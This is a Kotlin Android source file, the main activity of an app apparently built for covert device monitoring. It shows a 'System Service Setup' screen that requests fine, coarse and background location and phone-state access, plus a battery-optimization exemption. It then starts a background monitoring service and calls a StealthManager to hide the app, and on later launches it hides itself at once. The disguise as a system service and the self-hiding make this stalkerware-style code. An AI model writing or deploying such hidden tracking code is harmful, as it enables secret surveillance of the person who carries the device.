package com.monitor

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.monitor.service.MonitorService
import com.monitor.util.PrefsManager
import com.monitor.util.StealthManager

class MainActivity : AppCompatActivity() {

    companion object {
        private const val PERMISSION_REQUEST_CODE = 1001
    }

    private lateinit var prefsManager: PrefsManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        prefsManager = PrefsManager(this)

        // If already setup, go stealth and exit
        if (prefsManager.isSetupComplete()) {
            StealthManager.hideApp(this)
            finishAndRemoveTask()
            return
        }

        // Show setup UI
        setupUI()
    }

    private fun setupUI() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 96, 48, 48)
            setBackgroundColor(0xFF1a1a2e.toInt())
        }

        val title = TextView(this).apply {
            text = "System Service Setup"
            textSize = 24f
            setTextColor(0xFFFFFFFF.toInt())
        }

        val subtitle = TextView(this).apply {
            text = "This service requires the following permissions to monitor your device. All data is sent only to your personal server."
            textSize = 14f
            setTextColor(0xFFB0B0B0.toInt())
            setPadding(0, 16, 0, 32)
        }

        val permLocation = createPermissionItem("📍 Location Access", "Required for GPS tracking")
        val permPhone = createPermissionItem("📱 Device Info", "Required for battery, storage, connectivity monitoring")
        val permBoot = createPermissionItem("🔄 Auto Start", "Required to start monitoring after reboot")
        val permBattery = createPermissionItem("🔋 Battery Optimization", "Required to prevent system from killing the service")

        val grantButton = Button(this).apply {
            text = "Grant All Permissions & Start"
            setTextColor(0xFFFFFFFF.toInt())
            setBackgroundColor(0xFF0f3460.toInt())
            setPadding(32, 32, 32, 32)
            setOnClickListener { requestAllPermissions() }
        }

        layout.addView(title)
        layout.addView(subtitle)
        layout.addView(permLocation)
        layout.addView(permPhone)
        layout.addView(permBoot)
        layout.addView(permBattery)
        layout.addView(TextView(this).apply { setPadding(0, 24, 0, 0) })
        layout.addView(grantButton)

        setContentView(layout)
    }

    private fun createPermissionItem(title: String, desc: String): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 12, 0, 12)
            addView(TextView(this@MainActivity).apply {
                text = title
                textSize = 16f
                setTextColor(0xFFFFFFFF.toInt())
            })
            addView(TextView(this@MainActivity).apply {
                text = desc
                textSize = 12f
                setTextColor(0xFFB0B0B0.toInt())
            })
        }
    }

    private fun requestAllPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }

        ActivityCompat.requestPermissions(this, permissions.toTypedArray(), PERMISSION_REQUEST_CODE)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Request battery optimization exemption
            requestBatteryOptimization()

            // Mark setup complete
            prefsManager.setSetupComplete(true)

            // Start the monitoring service
            startMonitorService()

            // Go stealth
            StealthManager.hideApp(this)

            Toast.makeText(this, "Service started. App will now hide.", Toast.LENGTH_LONG).show()

            finishAndRemoveTask()
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            try { startActivity(intent) } catch (_: Exception) {}
        }
    }

    private fun startMonitorService() {
        val serviceIntent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
}
